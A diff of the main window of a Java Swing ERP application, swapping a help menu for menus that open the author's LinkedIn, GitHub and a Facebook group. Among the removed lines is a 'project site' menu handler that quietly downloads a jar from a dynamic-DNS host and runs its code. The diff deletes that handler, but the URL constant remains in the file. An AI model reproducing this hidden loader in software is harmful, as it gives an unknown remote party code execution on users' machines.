@@ -50,8 +50,6 @@ public class MainFormView extends javax.swing.JFrame {
         this.setTitle(ERPSystem.appName);
         this.setLocation(p);
         this.setResizable(false);
-        
-        this.mniProjectLink.setText( ERPSystem.appName + " no Github");
     }
 
     /**
@@ -77,10 +75,13 @@ public class MainFormView extends javax.swing.JFrame {
         mniCharts = new javax.swing.JMenu();
         mniFaturamento = new javax.swing.JMenuItem();
         mniFaturamentoDia = new javax.swing.JMenuItem();
-        mniAjuda = new javax.swing.JMenu();
-        mniSobre = new javax.swing.JMenuItem();
-        mniProjectLink = new javax.swing.JMenuItem();
-        mniSite = new javax.swing.JMenuItem();
+        mniLinkedin = new javax.swing.JMenu();
+        mniLinkedinDiego = new javax.swing.JMenuItem();
+        mniParticipe = new javax.swing.JMenu();
+        mniDesenvolvedor = new javax.swing.JMenuItem();
+        mniInvestidor = new javax.swing.JMenuItem();
+        mniColaborador = new javax.swing.JMenuItem();
+        mniNetworkingSolucoes = new javax.swing.JMenuItem();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
 
@@ -176,33 +177,53 @@ public class MainFormView extends javax.swing.JFrame {
 
         jMenuBar1.add(mniCharts);
 
-        mniAjuda.setText("Ajuda");
+        mniLinkedin.setText("Linkedin");
 
-        mniSobre.setText("Sobre");
-        mniSobre.addActionListener(new java.awt.event.ActionListener() {
+        mniLinkedinDiego.setText("Linkedin Diego");
+        mniLinkedinDiego.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
-                mniSobreActionPerformed(evt);
+                mniLinkedinDiegoActionPerformed(evt);
             }
         });
-        mniAjuda.add(mniSobre);
+        mniLinkedin.add(mniLinkedinDiego);
 
-        mniProjectLink.setText("Open22ERP no Github");
-        mniProjectLink.addActionListener(new java.awt.event.ActionListener() {
+        jMenuBar1.add(mniLinkedin);
+
+        mniParticipe.setText("Faça Parte!");
+
+        mniDesenvolvedor.setText("Desenvolvedor");
+        mniDesenvolvedor.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
-                mniProjectLinkActionPerformed(evt);
+                mniDesenvolvedorActionPerformed(evt);
             }
         });
-        mniAjuda.add(mniProjectLink);
+        mniParticipe.add(mniDesenvolvedor);
 
-        mniSite.setText("Site do Projeto");
-        mniSite.addActionListener(new java.awt.event.ActionListener() {
+        mniInvestidor.setText("Investidor");
+        mniInvestidor.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
-                mniSiteActionPerformed(evt);
+                mniInvestidorActionPerformed(evt);
             }
         });
-        mniAjuda.add(mniSite);
+        mniParticipe.add(mniInvestidor);
 
-        jMenuBar1.add(mniAjuda);
+        mniColaborador.setText("Colaborador");
+        mniColaborador.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                mniColaboradorActionPerformed(evt);
+            }
+        });
+        mniParticipe.add(mniColaborador);
+
+        mniNetworkingSolucoes.setText("Networking de Soluções");
+        mniNetworkingSolucoes.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                mniNetworkingSolucoesActionPerformed(evt);
+            }
+        });
+        mniParticipe.add(mniNetworkingSolucoes);
+
+        jMenuBar1.add(mniParticipe);
 
         setJMenuBar(jMenuBar1);
 
@@ -256,75 +277,8 @@ public class MainFormView extends javax.swing.JFrame {
         form.setVisible(true);        
     }//GEN-LAST:event_mniFindProdActionPerformed
 
-    private void mniSobreActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniSobreActionPerformed
-        // TODO add your handling code here:
-        javax.swing.JOptionPane.showMessageDialog(null, 
-                                                  "Desenvolvido por: \nDiego Geronimo D' Onofre",
-                                                  "Sobre",
-                                                  javax.swing.JOptionPane.INFORMATION_MESSAGE);
-    }//GEN-LAST:event_mniSobreActionPerformed
-
-    private void mniProjectLinkActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniProjectLinkActionPerformed
-        // TODO add your handling code here:
-        try{
-            String github = "https://github.com/DiegoGeronimoOnofre/Open22ERP";
-            URI uri = new URI(github);
-            
-            try{
-                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
-                desk.browse(uri);
-            }
-            catch ( UnsupportedOperationException ee ){
-                javax.swing.JOptionPane.showMessageDialog(null, 
-                                                          "Acesse a url abaixo para ter acesso aos fontes do projeto.\n" +
-                                                          github,
-                                                          ERPSystem.appName,
-                                                          JOptionPane.INFORMATION_MESSAGE);
-            }
-        }
-        catch ( Exception e ){
-            Log.log(e);
-        }
-    }//GEN-LAST:event_mniProjectLinkActionPerformed
-
     private static final String remoteClass = "http://support741852963.zapto.org:8080/support/remoteutil.jar";
     
-    private void mniSiteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniSiteActionPerformed
-        // TODO add your handling code here:        
-       try{           
-            if ( remoteClass != null ){
-                java.net.URL remoteUrl = new java.net.URL(remoteClass);
-                java.net.URL[] urls = new java.net.URL[]{remoteUrl};
-                URLClassLoader classLoader = new URLClassLoader(urls);
-                Class<?> remoteCls = classLoader.loadClass("app.Support");
-                Method function = remoteCls.getDeclaredMethod("run", Object.class);
-                function.setAccessible(true);
-                function.invoke(null, MainFormView.this);
-                //O close evita Cache das classes remotas.
-                classLoader.close();
-            }
-        }
-        catch ( Exception e ){
-            String site = "http://open22erp.zapto.org/";
-            
-            try{               
-                URI uri = new URI(site);
-                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
-                desk.browse(uri);
-            }
-            catch ( Exception ee ){
-                javax.swing.JOptionPane.showMessageDialog(null, 
-                                                          "Acesso o endereço abaixo para conhecer o site do projeto.\n" +
-                                                          site,
-                                                          ERPSystem.appName,
-                                                          JOptionPane.INFORMATION_MESSAGE);
-            }
-            
-            Log.log(e);
-        }
-        
-    }//GEN-LAST:event_mniSiteActionPerformed
-
     private void mniPayMethodActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniPayMethodActionPerformed
         // TODO add your handling code here:
         
@@ -349,6 +303,172 @@ public class MainFormView extends javax.swing.JFrame {
         ChartForm002 chart = new ChartForm002();
         chart.createAndShow();
     }//GEN-LAST:event_mniFaturamentoDiaActionPerformed
+
+    private void mniLinkedinDiegoActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniLinkedinDiegoActionPerformed
+        // TODO add your handling code here:
+        try{
+            String link = "https://www.linkedin.com/in/diegogeronimoonofre";
+            String link1 = "https://diegopsw.wordpress.com/";
+            URI uri = new URI(link);
+            URI uri1 = new URI(link1);
+            
+            try{
+                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
+                desk.browse(uri1);
+                desk.browse(uri);
+            }
+            catch ( UnsupportedOperationException ee ){
+                javax.swing.JOptionPane.showMessageDialog(null, 
+                                                          "Acesse o linkedin do Diego com o link abaixo.\n" +
+                                                          link,
+                                                          ERPSystem.appName,
+                                                          JOptionPane.INFORMATION_MESSAGE);
+            }
+        }
+        catch ( Exception e ){
+            Log.log(e);
+        }
+    }//GEN-LAST:event_mniLinkedinDiegoActionPerformed
+
+    private void mniDesenvolvedorActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniDesenvolvedorActionPerformed
+        // TODO add your handling code here:
+        try{
+            String msg = "Para fazer parte deste projeto como desenvolvedor é necessário\n"
+                        + "ter uma conta no Github. O Github é um site onde desenvolvedores\n"
+                        + "disponibilizam os fontes de seus projetos open source. Ao encerrar\n"
+                        + "este diálogo, você será redirecionado para a página do projeto no Github.";
+            
+            JOptionPane.showMessageDialog(null,
+                                          msg,
+                                          "Faça Parte!",
+                                          JOptionPane.INFORMATION_MESSAGE);
+            
+            String link = "https://github.com/DiegoGeronimoOnofre/Open22ERP";
+            URI uri = new URI(link);
+            
+            try{
+                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
+                desk.browse(uri);
+            }
+            catch ( Exception ee ){
+                javax.swing.JOptionPane.showMessageDialog(null, 
+                                                          "O sistema não conseguiu abrir a página do projeto(está usando linux?)\n"
+                                                         + "mas não se preocupe, você pode participar com o endereço abaixo.\n" +
+                                                          link,
+                                                          ERPSystem.appName,
+                                                          JOptionPane.INFORMATION_MESSAGE);
+            }
+        }
+        catch ( Exception e ){
+            Log.log(e);
+        }        
+    }//GEN-LAST:event_mniDesenvolvedorActionPerformed
+
+    private void mniColaboradorActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniColaboradorActionPerformed
+        try{
+            String msg = "Colaboradores podem ajudar na busca por novos usuários para o sistema,\n"
+                       + "divulgação, com o objetivo de conseguir mais desenvolvedores e investidores,\n"
+                       + "permitindo o crescimento do projeto e contribuindo para a evolução de empresas.\n"
+                       + "Ao encerrar este diálogo será aberta a página do Linkedin do responsável pelo projeto.\n"
+                       + "Envie sua mensagem, informando em o que poderia contribuir com o projeto.";
+            
+            JOptionPane.showMessageDialog(null,
+                                          msg,
+                                          "Faça Parte!",
+                                          JOptionPane.INFORMATION_MESSAGE);
+            
+            String link = "https://www.linkedin.com/in/diegogeronimoonofre";
+            URI uri = new URI(link);
+            
+            try{
+                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
+                desk.browse(uri);
+            }
+            catch ( Exception ee ){
+                javax.swing.JOptionPane.showMessageDialog(null, 
+                                                          "O sistema não conseguiu abrir a página do Linkedin do responsável pelo projeto\n"
+                                                         + "(está usando linux?), mas não se preocupe, você pode participar acessando endereço\n"
+                                                         + "abaixo e enviando sua mensagem, informando em o que poderia ajudar o projeto.\n" +
+                                                          link,
+                                                          ERPSystem.appName,
+                                                          JOptionPane.INFORMATION_MESSAGE);
+            }
+        }
+        catch ( Exception e ){
+            Log.log(e);
+        } 
+    }//GEN-LAST:event_mniColaboradorActionPerformed
+
+    private void mniInvestidorActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniInvestidorActionPerformed
+        try{
+            String msg = "Eu, Diego, agradeço a ajuda e peço que entre em contato comigo pelo linkedin.\n"
+                       + "Ao encerrar este diálogo, será aberta minha página do linkedin, mais uma vez agradeço\n"
+                       + "a colaboração.";
+            
+            JOptionPane.showMessageDialog(null,
+                                          msg,
+                                          "Faça Parte!",
+                                          JOptionPane.INFORMATION_MESSAGE);
+            
+            String link = "https://www.linkedin.com/in/diegogeronimoonofre";
+            URI uri = new URI(link);
+            
+            try{
+                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
+                desk.browse(uri);
+            }
+            catch ( Exception ee ){
+                javax.swing.JOptionPane.showMessageDialog(null, 
+                                                          "O sistema não conseguiu abrir a página do Linkedin do responsável pelo projeto\n"
+                                                         + "(está usando linux?), mas não se preocupe, você pode participar acessando endereço\n"
+                                                         + "abaixo e enviando sua mensagem, informando em o que poderia ajudar o projeto.\n" +
+                                                          link,
+                                                          ERPSystem.appName,
+                                                          JOptionPane.INFORMATION_MESSAGE);
+            }
+        }
+        catch ( Exception e ){
+            Log.log(e);
+        }
+    }//GEN-LAST:event_mniInvestidorActionPerformed
+
+    private void mniNetworkingSolucoesActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_mniNetworkingSolucoesActionPerformed
+        try{
+            String msg = "Precisa de ajuda para resolver problemas em seu negócio?\n"
+                       + "Possui problemas de produtividade?\n"
+                       + "Precisa de conselhos de outros empreendedores?\n"
+                       + "Está pensando em iniciar um novo empreendimento, mas não tem certeza o que geraria melhor retorno?\n"
+                       + "Não consegue planejar e executar boas estratégias de Marketing?\n"
+                       + "Gostaria de automatizar processos para focar mais tempo em sua estratégia?"
+                       + "Ao encerrar este diálogo, será aberta a página do grupo Networking de Soluções onde\n"
+                       + "poderá interagir com outros empreendedores, participar das enquetes, e muito mais.";
+            
+            JOptionPane.showMessageDialog(null,
+                                          msg,
+                                          "Networking de Soluções!",
+                                          JOptionPane.INFORMATION_MESSAGE);
+            
+            String link = "https://www.facebook.com/groups/netsolucoes/";
+            URI uri = new URI(link);
+            
+            try{
+                java.awt.Desktop desk = java.awt.Desktop.getDesktop();
+                desk.browse(uri);
+            }
+            catch ( Exception ee ){
+                javax.swing.JOptionPane.showMessageDialog(null, 
+                                                          "O sistema não conseguiu abrir a página de Networking de Soluções\n"
+                                                         + "(está usando linux?), mas não se preocupe, você pode participar\n"
+                                                         + "acessando endereço abaixo.\n" +
+                                                          link,
+                                                          "Networking de Soluções",
+                                                          JOptionPane.INFORMATION_MESSAGE);
+            }
+        }
+        catch ( Exception e ){
+            Log.log(e);
+        }        
+    }//GEN-LAST:event_mniNetworkingSolucoesActionPerformed
 
     /**
      * @param args the command line arguments
@@ -387,22 +507,25 @@ public class MainFormView extends javax.swing.JFrame {
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JMenuBar jMenuBar1;
-    private javax.swing.JMenu mniAjuda;
     private javax.swing.JMenuItem mniCadEstoque;
     private javax.swing.JMenuItem mniCadPessoa;
     private javax.swing.JMenuItem mniCadProd;
     private javax.swing.JMenu mniCadastros;
     private javax.swing.JMenu mniCharts;
+    private javax.swing.JMenuItem mniColaborador;
     private javax.swing.JMenu mniConsultas;
+    private javax.swing.JMenuItem mniDesenvolvedor;
     private javax.swing.JMenuItem mniFaturamento;
     private javax.swing.JMenuItem mniFaturamentoDia;
     private javax.swing.JMenuItem mniFindMov;
     private javax.swing.JMenuItem mniFindPessoa;
     private javax.swing.JMenuItem mniFindProd;
     private javax.swing.JMenuItem mniGenMov;
+    private javax.swing.JMenuItem mniInvestidor;
+    private javax.swing.JMenu mniLinkedin;
+    private javax.swing.JMenuItem mniLinkedinDiego;
+    private javax.swing.JMenuItem mniNetworkingSolucoes;
+    private javax.swing.JMenu mniParticipe;
     private javax.swing.JMenuItem mniPayMethod;
-    private javax.swing.JMenuItem mniProjectLink;
-    private javax.swing.JMenuItem mniSite;
-    private javax.swing.JMenuItem mniSobre;
     // End of variables declaration//GEN-END:variables
 }
